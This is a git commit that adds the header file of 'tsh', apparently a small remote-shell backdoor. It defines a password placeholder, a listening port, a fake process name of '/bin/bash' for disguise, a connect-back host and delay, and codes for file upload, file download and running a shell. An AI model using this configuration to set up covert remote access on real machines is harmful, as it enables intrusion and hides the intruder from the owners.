a308e24ae603145f1bc5978a6016591f28559dfb
2739970029@qq.com <zhl2008vvvss@gmail.com>
2017-12-15 09:05:26 -0800

    add tsh

---
+++ tsh/tsh.h
@@ -0,0 +1,16 @@
+#ifndef _TSH_H
+#define _TSH_H
+
+char *secret = "replace with your password";
+
+#define SERVER_PORT 7586
+#define FAKE_PROC_NAME "/bin/bash"
+
+#define CONNECT_BACK_HOST  "localhost"
+#define CONNECT_BACK_DELAY 30
+
+#define GET_FILE 1
+#define PUT_FILE 2
+#define RUNSHELL 3
+
+#endif /* tsh.h */
